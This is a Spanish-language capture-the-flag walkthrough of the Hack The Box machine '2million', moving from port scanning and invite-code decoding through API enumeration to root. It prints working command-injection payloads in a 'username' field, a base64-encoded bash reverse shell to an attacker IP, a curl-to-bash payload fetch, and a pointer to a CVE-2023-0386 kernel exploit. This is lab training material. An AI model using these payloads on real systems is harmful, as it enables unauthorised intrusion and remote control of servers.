1. Extraemos los puertos que están abiertos: 
```bash
sudo nmap -p- -sS -n -Pn --min-rate 5000 -vvv 10.10.11.221
```
---
	Respuesta
	```
	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack ttl 63
	80/tcp open  http    syn-ack ttl 63

2. hacemos un examen sobre que servicios y la versión de los mismos de cada puerto, antes debemos agregar "2million.htb" al archivo "Hosts":
```bash
sudo nmap -p22,80 -sVC --min-rate 5000 10.10.11.221 -oN tarjeted
```
---
	Respuesta
	```
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
	|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
	80/tcp open  http    nginx
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	|_http-title: Hack The Box :: Penetration Testing Labs
	|_http-trane-info: Problem with XML parsing of /evox/about
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

3. Tenemos una web con dos formularios:
	![[Pasted image 20230713182221.png]]
	![[Pasted image 20230713182243.png]]
	
4. vamos a ver el codigo fuente de la pagina de "Invite Code", y podemos ver que hay un script que valida los codigos:
   ```javaScript
   $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
```
6.  tambein podemos ver que hay un script sobre los codigos de invitacion: 
   ![[Pasted image 20230713201227.png]]
   vamos a verlo
   ```javaScript
   eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```
si nos fijamos podemos ver que esta ofuscado, por lo que vamos a hacerlo mas legible con [[de4js]],
```javaScript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```
7. Viendo esto podemos deducir que podemos hacer una peticion POST a la direccion: http://2million.htb/api/v1/invite/how/to/generate
   y agregarle las cabeceras y datos oportunos, este caso solamente tenemos que hacer una petición ya que debería de darnos un código, en este caso nos lo da cifrado
```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```
8.  hacemos uso de [[rot13]], y obtenemos:
	`Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr` -> In order to generate the invite code, make a POST request to /api/v1/invite/generate
9. al hacer la peticion POST tenemos lo siguiente:
```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "MUdMTlAtU1NIQlEtTlBOMlEtU1pSQlk=",
    "format": "encoded"
  }
}   
```
10. como podemos ver el formato esta "enconded" por lo que aun tenemos que descifrarlo, con [[base64]]
	código: 1GLNP-SSHBQ-NPN2Q-SZRBY%
11. ahora hacemos un POST al script que encontramos para verificar
    ```bash
    curl -X POST -d'code=1GLNP-SSHBQ-NPN2Q-SZRBY' http://2million.htb/api/v1/invite/verify | jq
	```
	como resultado tenemos:
```json
{
  "0": 200,
  "success": 1,
  "data": {
   "message": "Invite code is valid!"
  }
}
```
12. introducimos el código de invitación, nos registramos e iniciamos sesion
    ![[Pasted image 20230713235722.png]]
    ![[Pasted image 20230713235824.png]]
    ![[Pasted image 20230713235908.png]]
    
    
13.  hemos obtenido acceso a la plataforma
    ![[Pasted image 20230714000026.png]]
    ![[Pasted image 20230714003258.png]]
    
14. vamos a ver que nos dice burpsuite cuando le damos a regenerar la vpn dentro de "access", vemos que hace un GET a un direcorio
    ![[Pasted image 20230714003408.png]]
15.  vamos a ver que nos dice [[curl]] 
	![[Pasted image 20230714003628.png]]
	no tenemos acceso y esto se debe a que no le hemos pasado la cookie de sesion
```bash
 curl -v -H 'Cookie: PHPSESSID=gic3k0ocl74h9frc21ivvsqum1' http://2million.htb/api | jq

o tambien

curl -v --cookie  "PHPSESSID=gic3k0ocl74h9frc21ivvsqum1" http://2million.htb/api |jq
```
``
	vemos un directorio nuevo

16. podemos ver otro directorio
```json
{
  "/api/v1": "Version 1 of the API"
}
```
17. hacemos el mismo proceso de antes con esta nueva ruta y tenemos esta lista de rutas
```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
19. hacemos un curl al ultimo end_point
```json
{
  "status": "danger",
  "message": "Invalid content type."
}
```
21. y vemos un mensaje de error _Invalid content type_ debemos especificarle el tipo de contenido, que suele ser 
	[LINK](https://stackoverflow.com/questions/23714383/what-are-all-the-possible-values-for-http-content-type-header#48704300)
	en este caso:
	`content-type:application/json`
```bash
curl -X PUT --cookie "PHPSESSID=gic3k0ocl74h9frc21ivvsqum1" -H 'content-type:application/json' http://2million.htb/api/v1/admin/settings/update | jq
```
al poner este comando nos devuelve:
```json
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```
22. ponemos un mail y nos crea el vpn, y si nos fijamos podemos deducir que para crear el vpn, el server, puede estar ejecutando algun comando tipo `exec` por lo que podriamos injectar codigo de esta forma, **la parte de "ls"
```bash
curl -X POST --cookie "PHPSESSID=gic3k0ocl74h9frc21ivvsqum1" -H 'content-type:application/json' -d '{"username":"marce;ls;"}' http://2million.htb/api/v1/admin/vpn/generate
```
![[Pasted image 20230714015104.png]]
24. ahora podemos mandar una revershell a nuestro equipo para obtener acceso 
```bash
bash -i >& /dev/tcp/IP/PUERTO 0>&1
```
25. para poder pasarlo debemos hacer un pequeño truco, pasamos a [[base64]] el comando y lo decodeamos en el payload de esta forma:
```bash
curl -X POST --cookie "PHPSESSID=gic3k0ocl74h9frc21ivvsqum1" -H 'content-type:application/json' -d '{"username":"marce;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTIvNDQ0NCAwPiYx | base64 -d | bash;"}' http://2million.htb/api/v1/admin/vpn/generate
```
otra forma seria creando un servidor con python, donde haya un archivo con la revershell:
```bash
sudo python3 -m http.server 80
```
y luego poniendo este comando
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=gic3k0ocl74h9frc21ivvsqum1" -H 'content-type: application/json' -d '{"username":"marce;curl -X GET 10.10.14.212/payload.sh | bash;"}
```
27. previamente estaremos en escucha y ya temos una revershell, a la que le haremos un [[Tratamiento de la tty]]
	
28. si investiamos vemos que en el direcorio admin ya tenemos el sploit que hay que usar para ello vamos a seguir las instrucciones: https://github.com/sxlmnwb/CVE-2023-0386
    podemos hacer uso de `bash -i` para tener acceso a otra terminal de forma rapida
29. ya temos root
     ![[Pasted image 20230714134749.png]]
30. y podemos ver la flag del usuario admin, como la de root